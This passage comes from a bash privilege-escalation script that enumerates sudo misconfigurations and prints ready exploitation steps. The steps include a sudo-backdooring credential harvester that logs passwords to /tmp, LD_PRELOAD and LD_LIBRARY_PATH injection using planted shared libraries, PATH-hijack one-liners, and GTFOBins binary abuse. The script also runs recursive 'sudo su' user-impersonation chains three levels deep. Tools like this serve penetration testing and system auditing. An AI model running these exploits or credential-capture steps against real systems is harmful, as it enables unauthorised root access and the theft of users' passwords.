      echo -e "${BOLD}${RED}[+] Vulnerable to sudo backdooring (Creds Capture). ${RESET}"
      echo "[*] Exploit, run the following script to backdoor sudo and start harvesting credentials"
      echo "for current user > res/SK-credHarvest2.sh cuser <new|old> ; source /home/<current_user>/.bashrc"
      echo -e "new: [sudo] password for user:"
      echo -e "old: Password:"
      echo -e "TO STOP: run the same script again with same argument"
      echo -e "\n"
      echo -e "for all users [need root priv] > res/SK-credHarvest2.sh auser <new|old>"
      echo -e "the log /tmp/sk.hvest.log will contains the credentials"

    fi

    if [ "$wa" == "w" ]; then
      echo "Any user can write to the current user bashrc file"
      echo -e "${BOLD}${RED}[+] Vulnerable to sudo backdooring (Creds Capture). ${RESET}"
      echo "[*] Exploit, run the following script to backdoor sudo and start harvesting credentials"
      echo "for current user > res/SK-credHarvest2.sh cuser <new|old> ; source /home/<current_user>/.bashrc"
      echo -e "new: [sudo] password for user:"
      echo -e "old: Password:"
      echo "TO STOP: run the same script again with same argument"
      echo -e "\n"
      echo "for all users [need root priv] > res/SK-credHarvest2.sh auser"
      echo "the log /tmp/sk.hvest.log will contains the credentials"

    #echo "[*] Exploit, refer to the exploit res/credHarvest.sh"
    fi

  #hdir=`echo "" | ls -ld /home/*`
  #echo "$hdir"
  #hdir=`echo "" | ls -al /home/*/.bashrc`
  #echo "$hdir"

  # while read -r line; do

  # current=$line
  # wo=${current:2:1}
  # wg=${current:5:1}
  # wa=${current:8:1}

  # dir_user=$( echo "$current" | cut -d " " -f 3 )
  # #echo $dir_user

  # if [ "$current_user" == "$dir_user" ]
  # then
  # #echo $wo
  # #echo $wa

  # if [ "$wo" == "w" ]
  # then
  # # echo "Current user is the owner and can write the bashrc file"
  # echo -e "${BOLD}${RED}[+] Vulnerable to Creds Harvesting. ${RESET}"
  # echo "[*] Exploit, refer to the exploit res/credHarvest.sh"
  # fi

  # if [ "$wa" == "w" ]
  # then
  # # echo "Current user can write the bashrc file"
  # echo -e "${BOLD}${RED}[+] Vulnerable to Creds Harvesting. ${RESET}"
  # echo "[*] Exploit, refer to the exploit res/credHarvest.sh"
  # fi

  # # echo $line
  # fi # check owner
  # done <<< "$hdir"

  # echo -e "\n"

  #rm /tmp/sh_list1.txt

  fi # offline mode check
}

checkcredharvest() {

  echo -e "${BOLD}${YELLOW}[16/21] ====== Checking for backdooring sudo (Credentials Capture) ====== ${RESET} \n"
  fn_cred_harvest
  echo -e "${BOLD}${BLUE}\n[@] Check [16/21] Completed!${RESET} \n"

}

#------------------------------------------------------

function fn_dngbin3() {
  local binary="$1"
  local user_type="$2"
  local user="$3"
  local pwd_req="$4"
  local bin_path="$5"
  local ex_path="$PWD/dbins/$binary.txt"

  username=$(echo $user | sed 's/\/n/xx/g')
  #fusername=$(echo "$username" | tr ' ' ' or ')
  #username=$(echo -e "$user" | sed 's/\\n/ or /g')

  bin_path2=$(which "$binary")

  if [ -z "$bin_path2" ]; then
    bin_path2=$binary
  fi

  if [ -z "$username" ]; then
    username="Any_non_root_user"
  fi

  if [ -f "$ex_path" ]; then
    echo -e "[+] It is possible to ${BOLD}${RED}impersonate user: $username ${RESET}"
    echo -e "[+] $username's ${BOLD}${RED}password required: $pwd_req${RESET} "
    echo -e "[+] The binary ${BOLD}${RED}$binary${RESET} can be abused for the impersonation"
    echo -e "[+] Run the command: sudo -u "$username" $bin_path2 [<cmd>]"
    echo -e "[*] Where <cmd> is as below:"
    resgrep=$(echo '' | cat $PWD/dbins/"$binary".txt | grep -v "\* Sudo \*")
    echo -e "$resgrep \n"
    echo -e "-----------------------------------------------------------------------------------"
  fi
}

checkdangbin() {

  #  # only root user (user password required)
  #  sudo -l | grep -v "\!root" | grep -i root | grep -v NOPASSWD | sed 's/,/\n/g' | grep -i bin | cut -d / -f 2- | cut -d " " -f 1 | sort -u | sed 's#.*/##'

  #  # only root user with NOPASSWD
  # sudo -l |  grep -v "\!root" | grep -i root | grep -i NOPASSWD | sed 's/,/\n/g' | grep -i bin | cut -d / -f 2- | cut -d " " -f 1 | sort -u | sed 's#.*/##'

  #  # only non-root user with NOPASSWD
  # sudo -l |  grep -v "(root" | grep -i NOPASSWD | sed 's/,/\n/g' | grep -i bin | cut -d / -f 2- | cut -d " " -f 1 | sort -u | sed 's#.*/##'

  #  # only non-root user (user password required)
  # sudo -l | grep -v "(root" | grep -v NOPASSWD |  sed 's/,/\n/g' | grep -i bin | cut -d / -f 2- | cut -d " " -f 1 | sort -u | sed 's#.*/##'

  echo -e "${BOLD}${YELLOW}[18/21] ====== Checking for Dangerous binaries (gtfobins) ====== ${RESET} \n"
  echo -e "[-] dangerous bins (https://gtfobins.github.io/#+sudo): \n"

  sysbin_root_no_pwd=$(sudo -l | grep -v "\!root" | grep -i root | grep -i NOPASSWD | sed 's/,/\n/g' | grep -i bin | cut -d / -f 2- | cut -d " " -f 1 | sort -u | sed 's#.*/##' 2>/dev/null)
  if [ -z "$sysbin_root_no_pwd" ]; then
    echo "[-] Error: Unable to retrieve sudo permissions. Make sure you have sudo privileges."
    exit 1
  fi
  sysbin_root_req_pwd=$(sudo -l | grep -v "\!root" | grep -i root | grep -v NOPASSWD | sed 's/,/\n/g' | grep -i bin | cut -d / -f 2- | cut -d " " -f 1 | sort -u | sed 's#.*/##' 2>/dev/null)

  sysbin_user_no_pwd=$(sudo -l | grep -v "(root" | grep -i NOPASSWD | sed 's/,/\n/g' | grep -i bin | cut -d / -f 2- | cut -d " " -f 1 | sort -u | sed 's#.*/##' 2>/dev/null)
  sysbin_user_req_pwd=$(sudo -l | grep -v "(root" | grep -v NOPASSWD | sed 's/,/\n/g' | grep -i bin | cut -d / -f 2- | cut -d " " -f 1 | sort -u | sed 's#.*/##' 2>/dev/null)

  # Read content of text file for each binary
  for binary in $sysbin_root_no_pwd; do
    pth1=$(echo "$cmd" 2>/dev/null | grep ") NOPASSWD" | grep "root" | grep -w "bin/$binary" | cut -d ")" -f 2 | cut -d " " -f 2 | sort -u)
    fn_dngbin3 "$(basename "$binary")" "root" "root" "No" "$pth1"
  done

  # Read content of text file for each binary
  for binary in $sysbin_root_req_pwd; do
    pth2=$(echo "$cmd" 2>/dev/null | grep -v "NOPASSWD" | grep "root" | grep -w "bin/$binary" | cut -d ")" -f 2 | cut -d " " -f 2 | sort -u)
    fn_dngbin3 "$(basename "$binary")" "root" "root" "Yes" "$pth2"
  done

  # Read content of text file for each binary
  for binary in $sysbin_user_no_pwd; do
    usr3=$(echo "$cmd" 2>/dev/null | grep ") NOPASSWD:" | grep -v "root" | grep -w "bin/$binary" | cut -d ")" -f 1 | sed 's/[()]//g' | sed 's/ //g')
    pth3=$(echo "$cmd" 2>/dev/null | grep ") NOPASSWD" | grep -v "root" | grep -w "bin/$binary" | cut -d ")" -f 2 | cut -d " " -f 2 | sort -u)
    fn_dngbin3 "$(basename "$binary")" "non-root" "$usr3" "No" "$pth3"
  done

  # Read content of text file for each binary
  for binary in $sysbin_user_req_pwd; do
    usr4=$(echo "$cmd" 2>/dev/null | grep -v "NOPASSWD:" | grep -v "root" | grep -w "bin/$binary" | cut -d ")" -f 1 | sed 's/[()]//g' | sed 's/ //g')
    pth4=$(echo "$cmd" 2>/dev/null | grep -v "NOPASSWD" | grep -v "root" | grep -w "bin/$binary" | cut -d ")" -f 2 | cut -d " " -f 2 | sort -u)
    fn_dngbin3 "$(basename "$binary")" "non-root" "$usr4" "Yes" "$pth4"
  done

  echo -e "${BOLD}${BLUE}\n[@] Check [18/21] Completed!${RESET} \n"

} # checkdangbin

#------------------------------------------------------

fn_dang_envar() {

  # check for env_reset being disabled
  sudoenv=$(echo "$cmd" 2>/dev/null | grep "\!env\_reset")
  if [ "$sudoenv" ]; then
    #sudover1=`echo "$sudover" | sed 's/Sudo version //g'`
    #if [ "$sudover1" ]; then
    #versionToInt $sudover1

    #if [ "$cnver" -lt "1008025" ] ; then
    if [ "$cnver" -lt "1008005" ] && [ "$cnver" -gt "1006009" ]; then
      echo -e "${BOLD}${GREEN}[+] env_reset being disabled, This means we can manipulate the environment of the command we are allowed to run (depending on sudo version).${RESET}"
      echo -e "${BOLD}${RED}[+] Since the sudo version is > 1.6.9 and < 1.8.5, the environment variables are not removed and it is probably vulnerable to the CVE-2014-0106 ${RESET}"
      echo -e "[-] Exploit for the CVE:  CVE/CVE-2014-0106.txt \n"
    fi
  fi

  sudoenvkeep=$(echo "$cmd" 2>/dev/null | grep -i env_keep | sed 's/,/\n/g' | grep -i env_keep | cut -d "=" -f 2 | sed 's/"//g' | sed 's/ /, /g' | sed 'N;s/\n/,/')
  if [ "$sudoenvkeep" ]; then
     echo -e "${BOLD}${GREEN}[+] This is a list of environment variables that are preserved. They can potentially be abused. ${RESET}"
     echo -e "[-] $sudoenvkeep \n"
  fi

 #echo -e "\n"

  # check for LD_PRELOAD
  sudoenvld_preload=$(echo "$cmd" 2>/dev/null | grep "LD_PRELOAD")
  if [ "$sudoenvld_preload" ]; then
    echo -e "${BOLD}${RED}[+] LD_PRELOAD is set and is a dangerous environment variable.${RESET}"
    echo -e "[-] Notes on the exploitation of LD_PRELOAD : notes/env_exploit.txt"
    echo -e "[-] Exploit :"
    echo -e "     Step 1: cp res/Env_exploit.so /tmp/"
    echo -e "     Step 2: sudo LD_PRELOAD=/tmp/Env_exploit.so [a bin that can be executed with sudo such as ping/cp/find] \n"
  fi

  # check for LD_LIBRARY_PATH
  #varAp=$(echo "$cmd" 2>/dev/null | grep "/usr/sbin/apache2" )
  #if [ "$varAp" ]; then

  sudoenvld_lib_path=$(echo "$cmd" 2>/dev/null | grep "LD_LIBRARY_PATH")
  if [ "$sudoenvld_lib_path" ]; then
    echo -e "${BOLD}${RED}[+] LD_LIBRARY_PATH is set and is a dangerous environment variable.${RESET}"
    echo -e "[-] Notes on the exploitation of LD_LIBRARY_PATH : /notes/env_exploit.txt"
    echo -e "[-] Exploit :"
    echo -e "     Step 1 : Identify shared library with cmd > ldd <binary> "
    echo -e "     	example: ldd /usr/sbin/apache2 "
    echo -e "     Step 2: cp res/Env_exploit2.so /tmp/libcrypt.so.1"
    echo -e "     OR"
    echo -e "     Step 2: compile lib with cmd > gcc  -o /tmp/<shared_Lib> -shared -fPIC  res/ld_library.c "
    echo -e "     	example: gcc -o /tmp/libcrypt.so.1 -shared -fPIC exploits/ld_library.c "
    echo -e "     Step 3: sudo LD_LIBRARY_PATH=/tmp/ <binary> "
    echo -e "     	example: sudo LD_LIBRARY_PATH=/tmp/ apache2\n"

  else
    :
  fi

  #fi
   #echo -e "\n"

  echo -e "${BOLD}${GREEN}[+] Checking for dangerous environment variables such as PS4, PERL5OPT, PYTHONINSPECT,... .${RESET}"

  #>> use res/Dangerous_env_var.txt

  cat $PWD/res/Dangerous_env_var.txt | while read linen1; do
    sudoenvvar=$(echo "$cmd" 2>/dev/null | grep "$linen1")
    if [ "$sudoenvvar" ]; then
      echo "The dangerous environment variable $linen1 is set within sudo and is potentially vulnerable."
    fi
  done

  echo -e "\n"

}

checkdangenvar() {
  echo -e "${BOLD}${YELLOW}[17/21] ====== Checking for Dangerous Environment Variables ====== ${RESET} \n"
  fn_dang_envar
  echo -e "${BOLD}${BLUE}\n[@] Check [17/21] Completed!${RESET} \n"

} # checkdangenvar

#------------------------------------------------------
fn_recur_impersonate() {
  # # Intial - Get a list of potential users that can be impersonated from initial user sudo's rules
  # #user=`sudo -l | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | awk '{print $NF}' | sed 's/\*//g' | sort -u`
  # user=`sudo -l | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | awk '{print $NF}' | sed 's/\*/\/*/g' | sort -u`

  # # Clean
  # echo "" > impuser.txt

  # if [ "$user" ]; then

  #     echo -e "--------------------------------"
  #     echo -e "   ${BOLD}${YELLOW}LEVEL 1${RESET} : From $USER  ${BOLD}${BLUE}[1 jump]${RESET}"
  #     echo -e "--------------------------------"

  #     # check all the users gathered from sudo against /etc/passwd since wildcard could have been used.
  #     echo "$user" | while IFS= read -r line;
  #     do
  #         #to decomment - just for lab test since using number in username to track easier
  #         #cat /etc/passwd | cut -d: -f 1 | grep -iw "$line" >> impuser.txt
  #         #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw "$line\$"`
  #         imusr=`cat /etc/passwd | cut -d: -f 1 | grep -i "$line"`
  #         #echo $line
  #         if [ "$imusr" ]; then
  #         echo $imusr >> impuser.txt
  #         echo -e "${BOLD}${RED}[+] "$USER" -> "$imusr" ${RESET} "
  #         sudo -l 2>/dev/null| grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | grep -i $line
  #         echo -e "\n"
  #         fi
  #     done

  #        echo "" > impuser1.txt

  #     if [ -f "$PWD/impuser.txt" ]; then

  #            echo -e "--------------------------------"
  #            echo -e "   ${BOLD}${YELLOW}LEVEL 2${RESET} : ${BOLD}${BLUE}[2 jumps]${RESET}"
  #            echo -e "--------------------------------"

  #         # Check level 1 - Impersonation

  #             cat $PWD/impuser.txt | sort -u | while read line1
  #             do

  #                # user=`sudo -l | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | awk '{print $NF}' | sed 's/\*/\/*/g' | sort -u`
  #               # user1=`sudo /bin/su $line1 -c "export PATH="/usr/local/bin:$PATH"; sudo -l | grep "NOPASSWD:" | grep -iw "/\*bin/su \*" | grep -v "su root" | grep -v "/\*bin/su \-\$\|/\*bin/su \*\$\|/\*bin/su \- \*\$" | awk '{print $NF}'"`
  #                 sdr1=`sudo /bin/su "$line1" 2>/dev/null -c "export PATH="/usr/local/bin:$PATH"; sudo -l 2>/dev/null"`
  #                 if [ "$sdr1" ]; then

  #                 #$echo "$sdr1"
  #                 #user1=`echo "$sdr1" | grep "NOPASSWD:"| grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | sed 's/\*/\/*/g' | grep -v root | sort -u | awk '{print $NF}' | sed '/^[[:space:]]*$/d'`
  #                  user1=`echo "$sdr1" | grep "NOPASSWD:"| grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | sed 's/*/\/*/g' |  awk '{print $NF}'`
  #                     #echo "$user1"
  #                     echo "$user1" | while IFS= read -r line2;
  #                         do
  #                           if [ "$line2" ]; then
  #                             #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw "$line\$"`
  #                             imusr1=`cat /etc/passwd | cut -d: -f 1 | grep -i "$line2" 2>/dev/null`
  #                             #echo $line
  #                             if [ "$imusr1" ]; then
  #                             echo "$line1,$imusr1" >> impuser1.txt
  #                             echo -e "${BOLD}${RED}[+] "$USER" -> "$line1" -> "$imusr1" ${RESET}"
  #                             sr1=`echo "$sdr1" | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | grep -i $line2`
  #                             echo "$sr1"
  #                             echo -e "\n"
  #                             fi
  #                          fi
  #                         done

  #                 fi

  #             done

  #     fi

  #         if [ -f "$PWD/impuser1.txt" ]; then

  #            echo -e "--------------------------------"
  #            echo -e "   ${BOLD}${YELLOW}LEVEL 3${RESET} : ${BOLD}${BLUE}[3 jumps]${RESET}"
  #            echo -e "--------------------------------"

  #             # Check level 1 - Impersonation

  #             cat $PWD/impuser1.txt | sort -u | while read line3
  #             do

  #                 prlvl=`echo $line3 | cut -d"," -f1`
  #                 crlvl=`echo $line3 | cut -d"," -f2`
  #                # user=`sudo -l | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | awk '{print $NF}' | sed 's/\*/\/*/g' | sort -u`
  #               # user1=`sudo /bin/su $line1 -c "export PATH="/usr/local/bin:$PATH"; sudo -l | grep "NOPASSWD:" | grep -iw "/\*bin/su \*" | grep -v "su root" | grep -v "/\*bin/su \-\$\|/\*bin/su \*\$\|/\*bin/su \- \*\$" | awk '{print $NF}'"`
  #                 sdr1=`sudo /bin/su "$crlvl" 2>/dev/null -c "export PATH="/usr/local/bin:$PATH"; sudo -l 2>/dev/null"`
  #                 if [ "$sdr1" ]; then

  #                 #$echo "$sdr1"
  #                 #user1=`echo "$sdr1" | grep "NOPASSWD:"| grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | sed 's/\*/\/*/g' | grep -v root | sort -u | awk '{print $NF}' | sed '/^[[:space:]]*$/d'`
  #                  user1=`echo "$sdr1" | grep "NOPASSWD:"| grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | sed 's/*/\/*/g' |  awk '{print $NF}'`
  #                     #echo "$user1"
  #                     echo "$user1" | while IFS= read -r line4;
  #                         do
  #                           if [ "$line4" ]; then
  #                             #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw "$line\$"`
  #                             imusr2=`cat /etc/passwd | cut -d: -f 1 | grep -i "$line4" 2>/dev/null`
  #                             #echo $line
  #                             if [ "$imusr2" ]; then
  #                             echo "$imusr2" >> impuser2.txt
  #                            echo -e "${BOLD}${RED}[+] "$USER" -> "$prlvl" -> "$crlvl" -> "$imusr2" ${RESET} "
  #                             sr1=`echo "$sdr1" | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | grep -i $line4`
  #                             echo "$sr1"
  #                             echo -e "\n"
  #                             fi
  #                          fi
  #                         done

  #                 fi

  #             done

  #         fi

  # fi # initial check

  # Intial - Get a list of potential users that can be impersonated from initial user sudo's rules
  #user=`sudo -l | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | awk '{print $NF}' | sed 's/\*//g' | sort -u`
  user=$(sudo -l | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | grep -iv "\-c" | awk '{print $NF}' | sed 's/\*/\/*/g' | sort -u)

  # Clean
  echo "" >impuser.txt

  if [ "$user" ]; then

    echo -e "--------------------------------"
    echo -e "   ${BOLD}${YELLOW}LEVEL 1${RESET} : From $USER  ${BOLD}${BLUE}[1 jump]${RESET}"
    echo -e "--------------------------------"

    # check all the users gathered from sudo against /etc/passwd since wildcard could have been used.
    echo "$user" | while IFS= read -r line; do
      #to decomment - just for lab test since using number in username to track easier
      #cat /etc/passwd | cut -d: -f 1 | grep -iw "$line" >> impuser.txt
      #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw "$line\$"`
      imusr=$(cat /etc/passwd | cut -d: -f 1 | grep -ia "$line")
      #echo $line
      if [ "$imusr" ]; then
        echo $imusr >>impuser.txt
        echo -e "${BOLD}${RED}[+] "$USER" -> "$imusr" ${RESET} "
        sudo -l 2>/dev/null | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | grep -iv "\-c" | grep -i $line
        echo -e "\n"
      fi
    done

    echo "" >impuser1.txt

    if [ -f "$PWD/impuser.txt" ]; then

      echo -e "--------------------------------"
      echo -e "   ${BOLD}${YELLOW}LEVEL 2${RESET} : ${BOLD}${BLUE}[2 jumps]${RESET}"
      echo -e "--------------------------------"

      # Check level 1 - Impersonation

      cat $PWD/impuser.txt | sort -u | while read line1; do

        # user=`sudo -l | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | awk '{print $NF}' | sed 's/\*/\/*/g' | sort -u`
        # user1=`sudo /bin/su $line1 -c "export PATH="/usr/local/bin:$PATH"; sudo -l | grep "NOPASSWD:" | grep -iw "/\*bin/su \*" | grep -v "su root" | grep -v "/\*bin/su \-\$\|/\*bin/su \*\$\|/\*bin/su \- \*\$" | awk '{print $NF}'"`
        sdr1=$(sudo /bin/su "$line1" -c "export PATH="/usr/local/bin:$PATH"; sudo -l 2>/dev/null" 2>/dev/null)
        if [ "$sdr1" ]; then

          #$echo "$sdr1"
          #user1=`echo "$sdr1" | grep "NOPASSWD:"| grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | sed 's/\*/\/*/g' | grep -v root | sort -u | awk '{print $NF}' | sed '/^[[:space:]]*$/d'`
          user1=$(echo "$sdr1" | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | sed 's/*/\/*/g' | grep -iv "\-c" | awk '{print $NF}')
          #echo "$user1"
          echo "$user1" | while IFS= read -r line2; do
            if [ "$line2" ]; then
              #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw "$line\$"`
              imusr1=$(cat /etc/passwd | cut -d: -f 1 | grep -ia "$line2" 2>/dev/null)
              #echo $line
              if [ "$imusr1" ]; then
                echo "$line1,$imusr1" >>impuser1.txt
                echo -e "${BOLD}${RED}[+] "$USER" -> "$line1" -> "$imusr1" ${RESET}"
                sr1=$(echo "$sdr1" | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | grep -iv "\-c" | grep -i $line2)
                echo "$sr1"
                echo -e "\n"
              fi
            fi
          done

        fi

      done

    fi

    if [ -f "$PWD/impuser1.txt" ]; then

      echo -e "--------------------------------"
      echo -e "   ${BOLD}${YELLOW}LEVEL 3${RESET} : ${BOLD}${BLUE}[3 jumps]${RESET}"
      echo -e "--------------------------------"

      # Check level 1 - Impersonation

      cat $PWD/impuser1.txt | sort -u | while read line3; do

        prlvl=$(echo $line3 | cut -d"," -f1)
        crlvl=$(echo $line3 | cut -d"," -f2)
        # user=`sudo -l | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | awk '{print $NF}' | sed 's/\*/\/*/g' | sort -u`
        # user1=`sudo /bin/su $line1 -c "export PATH="/usr/local/bin:$PATH"; sudo -l | grep "NOPASSWD:" | grep -iw "/\*bin/su \*" | grep -v "su root" | grep -v "/\*bin/su \-\$\|/\*bin/su \*\$\|/\*bin/su \- \*\$" | awk '{print $NF}'"`
        sdr1=$(sudo /bin/su "$crlvl" -c "export PATH="/usr/local/bin:$PATH"; sudo -l 2>/dev/null" 2>/dev/null)
        if [ "$sdr1" ]; then

          #$echo "$sdr1"
          #user1=`echo "$sdr1" | grep "NOPASSWD:"| grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | sed 's/\*/\/*/g' | grep -v root | sort -u | awk '{print $NF}' | sed '/^[[:space:]]*$/d'`
          user1=$(echo "$sdr1" | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | sed 's/*/\/*/g' | awk '{print $NF}')
          #echo "$user1"
          echo "$user1" | while IFS= read -r line4; do
            if [ "$line4" ]; then
              #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw "$line\$"`
              imusr2=$(cat /etc/passwd | cut -d: -f 1 | grep -ia "$line4" 2>/dev/null)
              #echo $line
              if [ "$imusr2" ]; then
                echo "$imusr2" >>impuser2.txt
                echo -e "${BOLD}${RED}[+] "$USER" -> "$prlvl" -> "$crlvl" -> "$imusr2" ${RESET} "
                sr1=$(echo "$sdr1" | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$" | grep -i $line4)
                echo "$sr1"
                echo -e "\n"
              fi
            fi
          done

        fi

      done

    fi
  fi # initial check

    rm impuser.txt
    rm impuser1.txt
    rm impuser2.txt


}

checkrecurimper() {
  echo -e "${BOLD}${YELLOW}[19/21] ====== Checking for recursive user impersonation (depth:3) ====== ${RESET} \n"
  fn_recur_impersonate
  echo -e "${BOLD}${BLUE}\n[@] Check [19/21] Completed!${RESET} \n"

}

#------------------------------------------------------

find_non_full_path_binaries2() {
  local line_script="$1"

  sort_line_script=$(echo "$line_script" | sort -u)

  binaries_to_check="bash\|cat\|chmod\|cp\|ls\|mkdir\|mv\|rm\|echo\|grep\|ping\|ps\|su\|fdisk\|ifconfig\|iptables\|mount\|umount\|reboot\|shutdown\|curl\|tar\|unzip\|wget\|nano\|git\|gcc\|crond\|sshd\|ntpd\|sysctl\|node\|docker\|nginx\|ruby\|python\|python2\|python3\|find"

  while read -r sline; do
    echo -e "[-] Script Path: $sline"

    count=0
    cat "$sline" | while read line; 
    do
      #echo "$line"
      ((count++))   
      #chkbins=$(echo "$line" | grep -v "print" | grep -v "\#" | grep -w "$binaries_to_check" | cut -d " " -f 1 | grep -v "/" 2>/dev/null)
      chkbins=$(echo "$line" | grep -v "print" | grep -v "\#" | grep -v "/*bin/" | grep -wo "$binaries_to_check" 2>/dev/null)
      #echo "$chkbins"
      if [ "$chkbins" ]; then
        echo -e " [+] Found non-full path binary: ${YELLOW}"$chkbins"${RESET} at line ${YELLOW}$count${RESET} which can be abused!"
        echo -e " [*] Code: ${GREEN}$line${RESET}"
        echo -e " [*] Exploit: echo '#!/bin/bash' > /tmp/$chkbins;echo 'id' >> /tmp/$chkbins; chmod +x /tmp/$chkbins; sudo PATH=/tmp:\$PATH $sline; rm /tmp/$chkbins \n"
        #echo -e " [*] Exploit: echo '#!/bin/bash' > /tmp/[;echo 'id' >> /tmp/[; chmod +x /tmp/[; sudo PATH=/tmp:\$PATH \n"
      fi
    done

  done <<<"$sort_line_script"

}

find_shell_builtin()
{
 local line_script="$1"

  sort_line_script=$(echo "$line_script" | sort -u)
  while read -r sline; do
     #echo -e "[-] Script Path: $sline"
       lfile=`echo $sline | sed 's/ //g'`
       chkshlbi=$(cat "$lfile" | grep "enable -n " )
         #echo $lfile"
       if [ -n "$chkshlbi" ]; then
       echo -e "[+] SHELL Built-ins disabling command found! ${YELLOW}$chkshlbi${RESET} in ${GREEN}$lfile${RESET}"
       echo -e "[*] Note: notes/SHELL_BUILTIN.txt "
       echo -e "[*] Exploit: echo '#!/bin/bash' > /tmp/${BLUE}<shell_bin>${RESET};echo 'id' >> /tmp/${BLUE}<shell_bin>${RESET}; chmod +x /tmp/${BLUE}<shell_bin>${RESET}; sudo PATH=/tmp:\$PATH $sline"
       echo -e "[*] Example: echo '#!/bin/bash' > /tmp/[;echo 'id' >> /tmp/[; chmod +x /tmp/[; sudo PATH=/tmp:\$PATH $sline\n"
       fi

      chkshlbi1=$(cat "$lfile" | grep ".bashrc\|\.sh" )
      #echo "++ $chkshlbi1"
       if [ -n "$chkshlbi1" ]; then
       #echo "$chkshlbi1"
          
          ########### ISSUE HERE
           for sline2 in $chkshlbi1; do
          #while read -r sline2; do
               #echo "$sline2"
              chkshlbi2=$(cat "$sline2" | grep "enable -n " )
              if [ -n "$chkshlbi2" ]; then
                echo -e "[+] SHELL Built-ins disabling command found! ${YELLOW}$chkshlbi2${RESET} in ${GREEN}$sline2${RESET}"
                echo -e "[*] Note: notes/SHELL_BUILTIN.txt"
                echo -e "[*] Exploit: echo '#!/bin/bash' > /tmp/${BLUE}<shell_bin>${RESET};echo 'id' >> /tmp/${BLUE}<shell_bin>${RESET}; chmod +x /tmp/${BLUE}<shell_bin>${RESET}; sudo PATH=/tmp:\$PATH $sline"
                echo -e "[*] Example: echo '#!/bin/bash' > /tmp/[;echo 'id' >> /tmp/[; chmod +x /tmp/[; sudo PATH=/tmp:\$PATH $sline\n"
              fi
          #done <<< "$chkshlbi1"
          done
             
       fi

  done <<< "$sort_line_script"

}



fn_env_path_hijack() {

  sudoenvpath_hijack=$(echo "$cmd" 2>/dev/null | grep -w "\!env_reset")
  if [ "$sudoenvpath_hijack" ]; then
    echo -e "${BOLD}${YELLOW}[+] Environment Variable is not reset when sudo is used (!env_reset): ${RESET}${BOLD}${RED}Vulnerable to Path Hijacking!${RESET} \n"
  else
    seten=$(echo "$cmd" 2>/dev/null | grep -w "SETENV:" | grep ".sh\|.py\|.rb")
    #echo "$seten"
    if [ -n "$seten" ]; then
      echo -e "${BOLD}${YELLOW}[+] Tag SETENV is used along with script: ${RESET}${BOLD}${RED}Potentially vulnerable to Path Hijacking!${RESET} \n"
      echo "$seten"
      lseten=$(echo "$seten" | awk '{print $NF}')

      echo -e "\n"

      #for "$lscrp" in "$lseten"; do
      #echo "$lscrp"
      #find_non_full_path_binaries "$lseten"
      find_non_full_path_binaries2 "$lseten"

      echo -e "${BOLD}${YELLOW}[+] Checking for shell built-in disable command${RESET}\n"
      find_shell_builtin "$lseten"
      #done

    fi

  fi

}

fn_suid_with_sudo()
{

csuidbin=$(find / -user root -perm -4000 -print 2>/dev/null | grep -v "/usr/*\|/bin/*")
if [ -n "$csuidbin" ]; then

    for value in $csuidbin; do
        srelpath=$(strings "$value" | grep -i sudo | grep -v "bin/sudo")
        if [ -n "$srelpath" ]; then
            echo -e "[+] ${RED}Custom SUID binary found with sudo command (no full path)${RESET}"
